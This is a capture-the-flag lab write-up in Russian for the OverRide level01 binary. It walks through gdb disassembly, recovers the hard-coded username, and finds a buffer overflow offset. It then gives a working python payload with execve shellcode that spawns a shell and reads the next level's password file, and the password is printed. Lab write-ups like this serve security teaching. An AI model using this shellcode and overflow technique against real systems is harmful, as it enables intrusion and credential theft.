____________________________________________________________
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
____________________________________________________________

level01@OverRide:~$ ./level01
____________________________________________
********* ADMIN LOGIN PROMPT *********
Enter Username: level02
verifying username....

nope, incorrect username...
____________________________________________
У нас есть бинарный файл, который требует ввода некоего username

Прооверяем, что там есть:

(gdb) info var
________________________________________________
All defined variables:

Non-debugging symbols:
(...)
0x0804a040  a_user_name
________________________________________________

(gdb) info func
________________________________________________
All defined functions:

Non-debugging symbols:
(...)
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
(...)
________________________________________________

У нас есть одна глобальная переменная a_user_name и две самописные функции: verify_user_name и verify_user_pass.
Разберем каждую функцию:

(gdb) disass main
____________________________________________________________________________________________________________________________________________________
Dump of assembler code for function main:
   0x080484d0 <+0>:	push   %ebp
   0x080484d1 <+1>:	mov    %esp,%ebp
   0x080484d3 <+3>:	push   %edi
   0x080484d4 <+4>:	push   %ebx
   0x080484d5 <+5>:	and    $0xfffffff0,%esp
   0x080484d8 <+8>:	sub    $0x60,%esp
   0x080484db <+11>:	lea    0x1c(%esp),%ebx
   0x080484df <+15>:	mov    $0x0,%eax
   0x080484e4 <+20>:	mov    $0x10,%edx
   0x080484e9 <+25>:	mov    %ebx,%edi
   0x080484eb <+27>:	mov    %edx,%ecx
   0x080484ed <+29>:	rep stos %eax,%es:(%edi)
   0x080484ef <+31>:	movl   $0x0,0x5c(%esp)                  92
   0x080484f7 <+39>:	movl   $0x80486b8,(%esp)                "********* ADMIN LOGIN PROMPT *********"
   0x080484fe <+46>:	call   0x8048380 <puts@plt>
   0x08048503 <+51>:	mov    $0x80486df,%eax                  "Enter Username: "
   0x08048508 <+56>:	mov    %eax,(%esp)
   0x0804850b <+59>:	call   0x8048360 <printf@plt>
   0x08048510 <+64>:	mov    0x804a020,%eax                   ""
   0x08048515 <+69>:	mov    %eax,0x8(%esp)
   0x08048519 <+73>:	movl   $0x100,0x4(%esp)                 256
   0x08048521 <+81>:	movl   $0x804a040,(%esp)                ""
   0x08048528 <+88>:	call   0x8048370 <fgets@plt>
   0x0804852d <+93>:	call   0x8048464 <verify_user_name>
   0x08048532 <+98>:	mov    %eax,0x5c(%esp)
   0x08048536 <+102>:	cmpl   $0x0,0x5c(%esp)
   0x0804853b <+107>:	je     0x8048550 <main+128>             "\307\004$\r\207\004\b\350$\376\377\377\241 \240\004\b\211D$\b\307D$\004d"
   0x0804853d <+109>:	movl   $0x80486f0,(%esp)                "nope, incorrect username...\n"
   0x08048544 <+116>:	call   0x8048380 <puts@plt>             ""
   0x08048549 <+121>:	mov    $0x1,%eax
   0x0804854e <+126>:	jmp    0x80485af <main+223>             "\215e\370[_]Ð\220\220\220\220\220\220\220\220\220UWVS\350i"
   0x08048550 <+128>:	movl   $0x804870d,(%esp)                "Enter Password: "
   0x08048557 <+135>:	call   0x8048380 <puts@plt>
   0x0804855c <+140>:	mov    0x804a020,%eax                   ""
   0x08048561 <+145>:	mov    %eax,0x8(%esp)
   0x08048565 <+149>:	movl   $0x64,0x4(%esp)                  'd'
   0x0804856d <+157>:	lea    0x1c(%esp),%eax
   0x08048571 <+161>:	mov    %eax,(%esp)
   0x08048574 <+164>:	call   0x8048370 <fgets@plt>
   0x08048579 <+169>:	lea    0x1c(%esp),%eax
   0x0804857d <+173>:	mov    %eax,(%esp)
   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
   0x08048585 <+181>:	mov    %eax,0x5c(%esp)
   0x08048589 <+185>:	cmpl   $0x0,0x5c(%esp)
   0x0804858e <+190>:	je     0x8048597 <main+199>
   0x08048590 <+192>:	cmpl   $0x0,0x5c(%esp)
   0x08048595 <+197>:	je     0x80485aa <main+218>
   0x08048597 <+199>:	movl   $0x804871e,(%esp)                  "nope, incorrect password...\n"
   0x0804859e <+206>:	call   0x8048380 <puts@plt>
   0x080485a3 <+211>:	mov    $0x1,%eax
   0x080485a8 <+216>:	jmp    0x80485af <main+223>                -8
   0x080485aa <+218>:	mov    $0x0,%eax
   0x080485af <+223>:	lea    -0x8(%ebp),%esp
   0x080485b2 <+226>:	pop    %ebx
   0x080485b3 <+227>:	pop    %edi
   0x080485b4 <+228>:	pop    %ebp
   0x080485b5 <+229>:	ret
End of assembler dump.
____________________________________________________________________________________________________________________________________________________

(gdb) disass verify_user_name
____________________________________________________________________________________________________________________________________________________
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:	push   %ebp
   0x08048465 <+1>:	mov    %esp,%ebp
   0x08048467 <+3>:	push   %edi
   0x08048468 <+4>:	push   %esi
   0x08048469 <+5>:	sub    $0x10,%esp
   0x0804846c <+8>:	movl   $0x8048690,(%esp)                    "verifying username....\n"
   0x08048473 <+15>:	call   0x8048380 <puts@plt>
   0x08048478 <+20>:	mov    $0x804a040,%edx                  ""
   0x0804847d <+25>:	mov    $0x80486a8,%eax                  "dat_wil"
   0x08048482 <+30>:	mov    $0x7,%ecx
   0x08048487 <+35>:	mov    %edx,%esi
   0x08048489 <+37>:	mov    %eax,%edi
   0x0804848b <+39>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804848d <+41>:	seta   %dl
   0x08048490 <+44>:	setb   %al
   0x08048493 <+47>:	mov    %edx,%ecx
   0x08048495 <+49>:	sub    %al,%cl
   0x08048497 <+51>:	mov    %ecx,%eax
   0x08048499 <+53>:	movsbl %al,%eax
   0x0804849c <+56>:	add    $0x10,%esp
   0x0804849f <+59>:	pop    %esi
   0x080484a0 <+60>:	pop    %edi
   0x080484a1 <+61>:	pop    %ebp
   0x080484a2 <+62>:	ret
End of assembler dump.
____________________________________________________________________________________________________________________________________________________

(gdb) disass verify_user_pass
____________________________________________________________________________________________________________________________________________________
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>:	push   %ebp
   0x080484a4 <+1>:	mov    %esp,%ebp
   0x080484a6 <+3>:	push   %edi
   0x080484a7 <+4>:	push   %esi
   0x080484a8 <+5>:	mov    0x8(%ebp),%eax
   0x080484ab <+8>:	mov    %eax,%edx
   0x080484ad <+10>:	mov    $0x80486b0,%eax                  "admin"
   0x080484b2 <+15>:	mov    $0x5,%ecx
   0x080484b7 <+20>:	mov    %edx,%esi
   0x080484b9 <+22>:	mov    %eax,%edi
   0x080484bb <+24>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x080484bd <+26>:	seta   %dl
   0x080484c0 <+29>:	setb   %al
   0x080484c3 <+32>:	mov    %edx,%ecx
   0x080484c5 <+34>:	sub    %al,%cl
   0x080484c7 <+36>:	mov    %ecx,%eax
   0x080484c9 <+38>:	movsbl %al,%eax
   0x080484cc <+41>:	pop    %esi
   0x080484cd <+42>:	pop    %edi
   0x080484ce <+43>:	pop    %ebp
   0x080484cf <+44>:	ret
End of assembler dump.
____________________________________________________________________________________________________________________________________________________

Программа выполняет авторизацию пользователя, при этом на вход ожидаются значения "dat_wil" в качестве username и "admin" в качестве пароля. 
Попробуем ввести полученные данные:

(gdb) r
_____________________________________________________
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...

[Inferior 1 (process 1900) exited with code 01]
_____________________________________________________

Мы узнали, что логин действительно dat_wil, но с паролем промахнулись.
Также у нас не вызывается shell, поэтому нам нужно внедрить ее самостоятельно.
Из проекта rainfall помним, что функция fgets() уязвима к переполнению буффера. 
Используем эту уязвимость для совершения атаки на переполнение буффера.

(gdb) r
____________________________________________________________________________________________________________________________________________________
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()                                        сдвиг 80
____________________________________________________________________________________________________________________________________________________

Итак. благодаря (https://wiremask.eu/tools/buffer-overflow-pattern-generator/) узнаем, что сдвиг равен 80.
Теперь можно написать наш shellcode:

0-7: «dat_wil», чтобы перескочить через функцию `verify_user_name`.
8-32: наш 24-байтовый шелл-код
32: '\n', чтобы сбросить первый fgets
33-113: байты-заполнители, 80 из них для перезаписи eip следующими 4 байтами.
113-117: адрес глобальной переменной, взятой выше + 7, чтобы игнорировать «dat_wil», который мы ввели первым

level01@OverRide:~$ export shellcode=`python -c "print 'dat_wil' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\n' + 'a' * 80 + '\x08\x04\xa0\x47'[::-1]"`
level01@OverRide:~$ echo $shellcode
____________________________________________________________________________________________________________________________________________________
dat_wil1�Ph//shh/bin��PS�ᙰ
                           ̀ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaG�
____________________________________________________________________________________________________________________________________________________

level01@OverRide:~$ (python -c "print 'dat_wil' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\n' + 'a' * 80 + '\x08\x04\xa0\x47'[::-1]"; cat) | ./level01
____________________________________________________________________________________________________________________________________________________
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...
____________________________________________________________________________________________________________________________________________________
Мы запустили shell.

____________________________________________
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
____________________________________________